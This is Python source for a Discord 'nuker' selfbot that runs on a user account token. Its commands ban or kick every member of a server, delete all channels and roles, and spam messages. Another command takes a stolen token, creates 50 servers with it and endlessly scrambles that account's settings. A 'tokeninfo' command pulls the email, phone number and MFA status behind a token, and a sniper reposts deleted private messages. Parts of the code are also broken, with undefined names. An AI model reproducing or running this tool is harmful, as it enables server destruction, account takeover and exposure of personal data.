
class NUKER():
    __version__ = 0.1

import keep_alive
keep_alive.keep_alive()    

import discord, subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string, ctypes
import urllib.parse, urllib.request, re, json, requests, webbrowser, aiohttp, dns.name, asyncio, functools, logging

from discord.ext import (
    commands,
    tasks
)
from bs4 import BeautifulSoup as bs4
from urllib.parse import urlencode
from pymongo import MongoClient
from selenium import webdriver
from threading import Thread
from subprocess import call
from itertools import cycle
from colorama import Fore
from sys import platform
from PIL import Image
from gtts import gTTS


with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
password = config.get('password')
prefix = config.get('prefix')

giveaway_sniper = config.get('giveaway_sniper')
slotbot_sniper = config.get('slotbot_sniper')
nitro_sniper = config.get('nitro_sniper')
privnote_sniper = config.get('privnote_sniper')

stream_url = config.get('stream_url')
tts_language = config.get('tts_language')

bitly_key = config.get('bitly_key')
cat_key = config.get('cat_key')
weather_key = config.get('weather_key')
cuttly_key = config.get('cuttly_key')

width = os.get_terminal_size().columns
start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()

languages = {
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

locales = [ 
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

m_numbers = [
    ":one:",
    ":two:", 
    ":three:", 
    ":four:", 
    ":five:", 
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]

def Clear():
    os.system('cls')
Clear()

def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'

def Init():
    if config.get('token') == "token-here":
        Clear()
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your token in the config.json file"+Fore.RESET)
    else:
        token = config.get('token')
        try:
            TOP.run(token, bot=False, reconnect=True)
            os.system(f'title (TOPSelfbot) - Version {NUKER.__version__}')
        except discord.errors.LoginFailure:
            print(f"{Fore.RED}[ERROR] {Fore.YELLOW}Improper token has been passed"+Fore.RESET)
            os.system('pause >NUL')

TOP = commands.Bot(command_prefix=prefix, self_bot=True)

TOP.remove_command('help')

@TOP.event
async def on_message(message):


    def GiveawayData():
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"   
    +Fore.RESET)

    def SlotBotData():
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"   
    +Fore.RESET)  

    def NitroData(elapsed, code):
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]" 
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
        f"\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]"
        f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
        f"\n{Fore.WHITE} - CODE: {Fore.YELLOW}{code}"
    +Fore.RESET)

    def PrivnoteData(code):
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]" 
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
        f"\n{Fore.WHITE} - CONTENT: {Fore.YELLOW}[The content can be found at Privnote/{code}.txt]"
    +Fore.RESET)

    time = datetime.datetime.now().strftime("%H:%M %p")  
    if 'discord.gift/' in message.content:
            start = datetime.datetime.now()
            code = re.search("discord.gift/(.*)", message.content).group(1)
            token = config.get('token')
                
            headers = {'Authorization': token}
            r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem', 
                headers=headers,
            ).text
        
            elapsed = datetime.datetime.now() - start
            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

            if 'This gift has been redeemed already.' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Already Redeemed]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Success]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Unknown Gift Code]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'You are being rate limited.' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Ratelimited]"+Fore.RESET)  
                NitroData(elapsed, code)

    if 'Someone just dropped' in message.content:
        if slotbot_sniper == True:
            if message.author.id == 346353957029019648:
                try:
                    await message.channel.send('~grab')
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - SlotBot Couldnt Grab]"+Fore.RESET)
                    SlotBotData()                     
                print(""
                f"\n{Fore.CYAN}[{time} - Slotbot Grabbed]"+Fore.RESET)
                SlotBotData()
        else:
            return

    if 'GIVEAWAY' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:
                try:    
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - Giveaway Couldnt React]"+Fore.RESET)
                    GiveawayData()            
                print(""
                f"\n{Fore.CYAN}[{time} - Giveaway Sniped]"+Fore.RESET)
                GiveawayData()
        else:
            return

    if f'Congratulations <@{TOP.user.id}>' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:    
                print(""
                f"\n{Fore.CYAN}[{time} - Giveaway Won]"+Fore.RESET)
                GiveawayData()
        else:
            return

    await TOP.process_commands(message)


@TOP.event
async def on_connect():
    Clear()

    if giveaway_sniper == True:
        giveaway = "Active" 
    else:
        giveaway = "Disabled"

    if nitro_sniper == True:
        nitro = "Active"
    else:
        nitro = "Disabled"

    if slotbot_sniper == True:
        slotbot = "Active"
    else:
        slotbot = "Disabled"

    print(f'''{Fore.RED}




 █     █░ ▒█████   ██▓███  
▓█░ █ ░█░▒██▒  ██▒▓██░  ██▒
▒█░ █ ░█ ▒██░  ██▒▓██░ ██▓▒
░█░ █ ░█ ▒██   ██░▒██▄█▓▒ ▒
░░██▒██▓ ░ ████▓▒░▒██▒ ░  ░
░ ▓░▒ ▒  ░ ▒░▒░▒░ ▒▓▒░ ░  ░
  ▒ ░ ░    ░ ▒ ▒░ ░▒ ░     
  ░   ░  ░ ░ ░ ▒  ░░       
    ░        ░ ░           
                           


                {Fore.MAGENTA}Made by Wopster Verto And Jlang
    ''')
    print(f'{Fore.RED}                      Version | {NUKER.__version__}')
    print(f'{Fore.MAGENTA}                      Logged in as: | {TOP.user.name}  {TOP.user.discriminator}'
   f'{Fore.YELLOW}   |   User ID | {Ryah.user.id}')
    print(f'{Fore.GREEN}                      Prefix | {prefix}')
    print(f'{Fore.CYAN}                      Nitro Sniper | {nitro}')
    print(f'{Fore.CYAN}                      Giveaway Sniper | {giveaway}') 
    print(f'{Fore.CYAN}                      Slotbot Sniper | {slotbot}')
     

@TOP.command()
async def help(ctx):
 await ctx.message.delete()
 embed = discord.Embed(color=ctx.author.color, timestamp=ctx.message.created_at)

 embed.set_author(name="WOPSTAR Nuker / Selfbot ", icon_url=ctx.author.avatar_url)

 embed.add_field(name="WOPSTAR selfbot", value="On Top", inline=False)
 embed.add_field(name="•RAID CMD", value="*nuke, 𝘮𝘢𝘴𝘴𝘣𝘢𝘯, 𝘮𝘢𝘴𝘴𝘶𝘯𝘣𝘢𝘯, 𝘥𝘮𝘢𝘭𝘭, 𝘮𝘢𝘴𝘴𝘬𝘪𝘤𝘬, 𝘥𝘦𝘭𝘳𝘰𝘭𝘦𝘴, 𝘥𝘦𝘭𝘤𝘩𝘢𝘯𝘯𝘦𝘭𝘴, 𝘱𝘶𝘳𝘨𝘦*", inline=False)
 embed.add_field(name="•ACC CMDS", value="*𝘴𝘵𝘳𝘦𝘢𝘮, 𝘨𝘢𝘮𝘦, 𝘭𝘪𝘴𝘵𝘦𝘯𝘪𝘯𝘨, 𝘸𝘢𝘵𝘤𝘩𝘪𝘯𝘨, 𝘮𝘴𝘨𝘴𝘯𝘪𝘱𝘦𝘳 𝘰𝘯/𝘰𝘧𝘧, 𝘧𝘪𝘳𝘴𝘵 𝘮𝘦𝘴𝘴𝘢𝘨𝘦 (𝘧𝘮), 𝘧𝘢𝘬𝘦𝘯𝘦𝘵*",inline=False)
 embed.add_field(name="•FUN CMD", value="*8𝘣𝘢𝘭𝘭, 𝘱𝘰𝘭𝘭, 𝘥𝘰𝘨, 𝘧𝘰𝘹, 𝘧𝘢𝘯𝘤𝘺, 𝘸𝘩𝘰𝘪𝘴, 𝘢𝘶𝘵𝘰𝘯𝘢𝘮𝘦, 𝘨𝘳𝘰𝘶𝘱𝘭𝘦𝘢𝘷𝘦𝘳, 𝘤𝘰𝘱𝘺*", inline=False)
 embed.add_field(name="•NSFW CMD", value="*𝘣𝘰𝘰𝘣𝘴, 𝘩𝘦𝘯𝘵𝘢𝘪, 𝘥𝘪𝘤𝘬 @𝘱𝘦𝘳𝘴𝘰𝘯, 𝘬𝘪𝘴𝘴 @𝘱𝘦𝘳𝘴𝘰𝘯, 𝘧𝘶𝘤𝘬 @𝘱𝘦𝘳𝘴𝘰𝘯, 𝘴𝘭𝘢𝘱 @𝘱𝘦𝘳𝘴𝘰𝘯*", inline=False)
 embed.add_field(name="•HACK CMD", value="*𝘥𝘪𝘴𝘢𝘣𝘭𝘦, 𝘥𝘥𝘰𝘹, 𝘵𝘰𝘬𝘦𝘯𝘪𝘯𝘧𝘰, 𝘵𝘰𝘬𝘦𝘯 @𝘱𝘦𝘳𝘴𝘰𝘯*", inline=False)
 embed.set_image(url="https://media.discordapp.net/attachments/784267115992973382/784268148320763905/image0.gif")
 embed.set_footer(text="wopstarW |wopstar selfbot")
 embed.set_thumbnail(url="client.user.avatarURL")
 await ctx.send(embed=embed)
 embed = discord.Embed(color=ctx.author.color, timestamp=ctx.message.created_at)

@TOP.command(pass_context=True)
async def nuke(ctx):
	await ctx.message.delete()
	await ctx.send("**WOPSTAR Steppa Shit**")
	show_avatar = discord.Embed(color=ctx.author.color)
	show_avatar.set_image(
	    url=
	    'https://media.discordapp.net/attachments/785204361550626836/785598606911733840/image0_8.gif'
	)

	await ctx.send(embed=show_avatar)
	for user in list(ctx.guild.members):
		try:
			await ctx.guild.ban(user)
			print(f"{user.name} has been banned from {ctx.guild.name}")
		except:
			print(f"{user.name} has NOT been banned from {ctx.guild.name}")
	for channel in ctx.guild.channels:
		await channel.delete()
		print(f'Spam channel deleting proccession has been complete.')
	for i in range(1, 25):
		await ctx.guild.create_text_channel(name=f'wopstar was here {i}')
		await ctx.guild.create_voice_channel(name=f'wopstar was here {i}')
		await ctx.guild.create_category(name=f'WOPSTAR was here  {i}')
		print(
		    f'{Fore.GREEN}Spam role and channel creating proccession has been complete.'
		)
		print('alr done wizzing')

@TOP.command()
async def delchannels(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return

@TOP.command() 
async def delroles(ctx): # b'\xfc'
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

@TOP.command()
async def massunban(ctx): # b'\xfc'
    await ctx.message.delete()    
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass

@TOP.command()
async def massban(ctx): # b'\xfc'
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass 

@TOP.command()
async def masskick(ctx): # b'\xfc'
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.kick()
        except:
            pass  

@TOP.command()
async def ping(ctx):
    await ctx.message.delete()
    await ctx.send(f"`{round(TOP.latency *1000)}ms.`")

@TOP.command()
async def purge(ctx, amount: int): # b'\xfc'
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == TOP.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass


@TOP.command()
async def stream(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url=stream_url, 
    )
    await TOP.change_presence(activity=stream)

@TOP.command(aliases=['dong', 'penis'])
async def dick(ctx, *, user: discord.Member = None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    size = random.randint(1, 15)
    dong = ""
    for _i in range(0, size):
        dong += "="
    em = discord.Embed(title=f"{user}'s Dick size", description=f"8{dong}D", colour=0x0000)
    await ctx.send(embed=em)

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

@TOP.command()
async def watching(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    await TOP.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching, 
            name=message
        ))

@TOP.command()
async def game(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await TOP.change_presence(activity=game)


@TOP.command(aliases=['fakeconnection', 'spoofconnection', 'spoofcon', "fakecon"])
async def fakenet(ctx, _type=None, *, name=None):
    await ctx.message.delete()
    if _type is None or name is None:
        await ctx.send("missing parameters")
        return
    ID = random.randrange(10000000, 90000000)
    avaliable = [
        'battlenet',
        'skype',
        'lol']
    payload = {
        'name': name,
        'visibility': 1
    }
    token = config.get('token')
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
    }

    if name is None:
        name = 'about:blank'
    elif _type not in avaliable:
        await ctx.send(f'Avaliable connections: `{avaliable}`', delete_after=3)
        return
    r = requests.put(f'https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}',
                     data=json.dumps(payload), headers=headers)
    if r.status_code == 200:
        await ctx.send(f"Invalid connection_type: `{type}` with Username: `{name}` and ID: `{ID}`", delete_after=3)
    else:
        await ctx.send(
            '**[ERROR]** `TOP Fake-Connection doesn\'t work anymore because Discord patched connection-spoofing`')

@TOP.command()
async def listening(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    await TOP.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening, 
            name=message, 
        ))  

@TOP.command(name='8ball')
async def _ball(ctx, *, question): # b'\xfc'
    await ctx.message.delete()
    responses = [
      'That is a resounding no',
      'It is not looking likely',
      'Too hard to tell',
      'It is quite possible',
      'That is a definite yes!',
	  'Maybe',
	  'There is a good chance'
    ]
    answer = random.choice(responses)
    embed = discord.Embed()
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
    embed.set_footer(text=datetime.datetime.now())
    await ctx.send(embed=embed)


@TOP.command()
async def dog(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    em = discord.Embed(title="Random Dog Image", color=16202876)
    em.set_image(url=str(r['message']))
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(str(r['message']))

@TOP.command()
async def fox(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://randomfox.ca/floof/').json()
    em = discord.Embed(title="Random Fox Image", color=16202876)
    em.set_image(url=r["image"])
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(r['image'])     

@TOP.command()
async def joke(ctx):  # b'\xfc'
    await ctx.message.delete()
    headers = {
        "Accept": "application/json"
    }
    async with aiohttp.ClientSession()as session:
        async with session.get("https://icanhazdadjoke.com", headers=headers) as req:
            r = await req.json()
    await ctx.send(r["joke"])

@TOP.command(pass_context=True, aliases=["auto"])
async def autoname(ctx):
	await ctx.message.delete()

	while True:
		name = ""

		for letter in TOP.user.name:
			name = name + letter
			await ctx.message.author.edit(nick=name)

@TOP.command()
async def fancy(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```'+r+'```') > 2000:
        return
    await ctx.send(f"```{r}```")

@TOP.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None): # b'\xfc'
    await ctx.message.delete()  
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(description=first_message.content)
    embed.add_field(name="First Message", value=f"[Jump]({first_message.jump_url})")
    await ctx.send(embed=embed)

@TOP.command()
async def slap(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"top_slap.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)       

@TOP.command()
async def spam(ctx, amount: int, *, message):  # b'\xfc'
	await ctx.message.delete()
	for _i in range(amount):
		await ctx.send(message)

@TOP.command()
async def logout(ctx): # b'\xfc'
    await ctx.message.delete()
    await TOP.logout()

@TOP.command()
async def boobs(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)   

@TOP.command(aliases=["copyguild", "copyserver"])
async def copy(ctx):
	await ctx.message.delete()
	await TOP.create_guild(f'backup-{ctx.guild.name}')
	await asyncio.sleep(4)
	for g in TOP.guilds:
		if f'backup-{ctx.guild.name}' in g.name:
			for c in g.channels:
				await c.delete()
			for cate in ctx.guild.categories:
				x = await g.create_category(f"{cate.name}")
				for chann in cate.channels:
					if isinstance(chann, discord.VoiceChannel):
						await x.create_voice_channel(f"{chann}")
					if isinstance(chann, discord.TextChannel):
						await x.create_text_channel(f"{chann}")
	try:
		await g.edit(icon=ctx.guild.icon_url)
	except:
		pass

@TOP.command()
async def lenny(ctx): # b'\xfc'
    await ctx.message.delete()
    lenny = '( ͡° ͜ʖ ͡°)'
    await ctx.send(lenny)

@TOP.command(name='groupleaver', aliase=['leaveallgroups', 'leavegroup', 'leavegroups'])
async def _group_leaver(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in TOP.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()
          
@TOP.command(name='backup-f', aliases=['friendbackup', 'friend-backup', 'backup-friends', 'backupf'])
async def _backup_f(ctx): # b'\xfc'
    await ctx.message.delete()
    for friend in TOP.user.friends:
       friendlist = (friend.name)+'#'+(friend.discriminator)   
       with open('Backup/Friends.txt', 'a+') as f:
           f.write(friendlist+"\n" )
    for block in TOP.user.blocked:
        blocklist = (block.name)+'#'+(block.discriminator)
        with open('Backup/Blocked.txt', 'a+') as f: 
            f.write(blocklist+"\n" )





@TOP.command()
async def whois(ctx, *, user: discord.Member = None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author      
    date_format = "%a, %d %b %Y %I:%M %p"
    em = discord.Embed(description=user.mention)
    em.set_author(name=str(user), icon_url=user.avatar_url)
    em.set_thumbnail(url=user.avatar_url)
    em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
    members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
    em.add_field(name="Join position", value=str(members.index(user)+1))
    em.add_field(name="Registered", value=user.created_at.strftime(date_format))
    if len(user.roles) > 1:
        role_string = ' '.join([r.mention for r in user.roles][1:])
        em.add_field(name="Roles [{}]".format(len(user.roles)-1), value=role_string, inline=False)
    perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
    em.add_field(name="Guild permissions", value=perm_string, inline=False)
    em.set_footer(text='ID: ' + str(user.id))
    return await ctx.send(embed=em)

TOP.msgsniper = True
TOP.sniped_edited_message_dict = {}
TOP.sniped_message_dict = {}


@TOP.event
async def on_message_delete(message):
	if message.author.id == TOP.user.id:
		return
	if TOP.msgsniper:
		if isinstance(message.channel, discord.DMChannel) or isinstance(
		    message.channel, discord.GroupChannel):
			attachments = message.attachments
			if len(attachments) == 0:
				message_content = "`" + str(
				    discord.utils.escape_markdown(str(
				        message.author))) + "`: " + str(
				            message.content).replace(
				                "@everyone", "@\u200beveryone").replace(
				                    "@here", "@\u200bhere")
				await message.channel.send(message_content)
			else:
				links = ""
				for attachment in attachments:
					links += attachment.proxy_url + "\n"
				message_content = "`" + str(
				    discord.utils.escape_markdown(str(message.author))
				) + "`: " + discord.utils.escape_mentions(
				    message.content) + "\n\n**Attachments:**\n" + links
				await message.channel.send(message_content)
	if len(TOP.sniped_message_dict) > 1000:
		TOP.sniped_message_dict.clear()
	attachments = message.attachments
	if len(attachments) == 0:
		channel_id = message.channel.id
		message_content = "`" + str(
		    discord.utils.escape_markdown(str(
		        message.author))) + "`: " + str(message.content).replace(
		            "@everyone", "@\u200beveryone").replace(
		                "@here", "@\u200bhere")
		TOP.sniped_message_dict.update({channel_id: message_content})
	else:
		links = ""
		for attachment in attachments:
			links += attachment.proxy_url + "\n"
		channel_id = message.channel.id
		message_content = "`" + str(
		    discord.utils.escape_markdown(str(
		        message.author))) + "`: " + discord.utils.escape_mentions(
		            message.content) + "\n\n**Attachments:**\n" + links
		TOP.sniped_message_dict.update({channel_id: message_content})


@TOP.event
async def on_message_edit(before, after):
	if before.author.id == TOP.user.id:
		return
	if TOP.msgsniper:
		if before.content is after.content:
			return
		if isinstance(before.channel, discord.DMChannel) or isinstance(
		    before.channel, discord.GroupChannel):
			attachments = before.attachments
			if len(attachments) == 0:
				message_content = "`" + str(
				    discord.utils.escape_markdown(str(before.author))
				) + "`: \n**BEFORE**\n" + str(before.content).replace(
				    "@everyone", "@\u200beveryone").replace(
				        "@here", "@\u200bhere") + "\n**AFTER**\n" + str(
				            after.content).replace("@everyone",
				                                   "@\u200beveryone").replace(
				                                       "@here", "@\u200bhere")
				await before.channel.send(message_content)
			else:
				links = ""
				for attachment in attachments:
					links += attachment.proxy_url + "\n"
				message_content = "`" + str(
				    discord.utils.escape_markdown(str(before.author))
				) + "`: " + discord.utils.escape_mentions(
				    before.content) + "\n\n**Attachments:**\n" + links
				await before.channel.send(message_content)
	if len(TOP.sniped_edited_message_dict) > 1000:
		TOP.sniped_edited_message_dict.clear()
	attachments = before.attachments
	if len(attachments) == 0:
		channel_id = before.channel.id
		message_content = "`" + str(
		    discord.utils.escape_markdown(str(
		        before.author))) + "`: \n**BEFORE**\n" + str(
		            before.content).replace(
		                "@everyone", "@\u200beveryone").replace(
		                    "@here", "@\u200bhere") + "\n**AFTER**\n" + str(
		                        after.content).replace(
		                            "@everyone", "@\u200beveryone").replace(
		                                "@here", "@\u200bhere")
		TOP.sniped_edited_message_dict.update({channel_id: message_content})
	else:
		links = ""
		for attachment in attachments:
			links += attachment.proxy_url + "\n"
		channel_id = before.channel.id
		message_content = "`" + str(
		    discord.utils.escape_markdown(str(
		        before.author))) + "`: " + discord.utils.escape_mentions(
		            before.content) + "\n\n**Attachments:**\n" + links
		TOP.sniped_edited_message_dict.update({channel_id: message_content})


@TOP.command(aliases=[])
async def msgsniper(ctx, ):
	await ctx.message.delete()
	if str(msgsniper).lower() == 'true' or str(
	    msgsniper).lower() == 'on':
		TOP.msgsniper = True
		await ctx.send("EX Message-Sniper is now disabled")
	elif str(msgsniper).lower() == 'false' or str(
	    msgsniper).lower() == 'off':
		TOP.msgsniper = False
		await ctx.send("EX Message-Sniper is now disabled")


@TOP.command(aliases=["esnipe"])
async def editsnipe(ctx):
	await ctx.message.delete()
	currentChannel = ctx.channel.id
	if currentChannel in TOP.sniped_edited_message_dict:
		await ctx.send(TOP.sniped_edited_message_dict[currentChannel])
	else:
		await ctx.send("No message to snipe!")


@TOP.command()
async def uptime(ctx):
	await ctx.message.delete()
	uptime = datetime.datetime.utcnow() - start_time
	uptime = str(uptime).split('.')[0]
	await ctx.send(f'' + uptime + '')


@TOP.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.Member=None): # b'\xfc'
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
	    format = "png"
    avatar = user.avatar_url_as(format = format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file = discord.File(file, f"Avatar.{format}"))


@TOP.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token):  # b'\xfc'
	await ctx.message.delete()
	headers = {'Authorization': _token, 'Content-Type': 'application/json'}
	try:
		res = requests.get(
		    'https://canary.discordapp.com/api/v6/users/@me', headers=headers)
		res = res.json()
		user_id = res['id']
		locale = res['locale']
		avatar_id = res['avatar']
		language = languages.get(locale)
		creation_date = datetime.datetime.utcfromtimestamp(
		    ((int(user_id) >> 22) + 1420070400000) /
		    1000).strftime('%d-%m-%Y %H:%M:%S UTC')
	except KeyError:
		print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Invalid token" + Fore.RESET)
	em = discord.Embed(
	    description=
	    f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})"
	)
	fields = [
	    {
	        'name': 'Phone',
	        'value': res['phone']
	    },
	    {
	        'name': 'Flags',
	        'value': res['flags']
	    },
	    {
	        'name': 'Local language',
	        'value': res['locale'] + f"{language}"
	    },
	    {
	        'name': 'MFA?',
	        'value': res['mfa_enabled']
	    },
	    {
	        'name': 'Verified?',
	        'value': res['verified']
	    },
	]
	for field in fields:
		if field['value']:
			em.add_field(
			    name=field['name'], value=field['value'], inline=False)
			em.set_thumbnail(
			    url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
			)
	return await ctx.send(embed=em)


@TOP.command()
async def disable(ctx, _token):  # b'\xfc'
	await ctx.message.delete()
	headers = {
	    'User-Agent':
	    'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
	    'Content-Type':
	    'application/json',
	    'Authorization':
	    _token,
	}
	request = requests.Session()
	payload = {
	    'theme': "light",
	    'locale': "ja",
	    'message_display_compact': False,
	    'inline_embed_media': False,
	    'inline_attachment_media': False,
	    'gif_auto_play': False,
	    'render_embeds': False,
	    'render_reactions': False,
	    'animate_emoji': False,
	    'convert_emoticons': False,
	    'enable_tts_command': False,
	    'explicit_content_filter': '0',
	    'status': "invisible"
	}
	guild = {
	    'channels': None,
	    'icon': None,
	    'name': "DONT FUCK WITH TOP",
	    'region': "europe"
	}
	for _i in range(50):
		requests.post(
		    'https://discordapp.com/api/v6/guilds',
		    headers=headers,
		    json=guild)
	while True:
		try:
			request.patch(
			    "https://canary.discordapp.com/api/v6/users/@me/settings",
			    headers=headers,
			    json=payload)
		except Exception as e:
			print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
		else:
			break
	modes = cycle(["light", "dark"])
	statuses = cycle(["online", "idle", "dnd", "invisible"])
	while True:
		setting = {
		    'theme': next(modes),
		    'locale': random.choice(locales),
		    'status': next(statuses)
		}
		while True:
			try:
				request.patch(
				    "https://canary.discordapp.com/api/v6/users/@me/settings",
				    headers=headers,
				    json=setting,
				    timeout=10)
			except Exception as e:
				print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
			else:
				break
              


TOP.run('your tokens', bot=False)
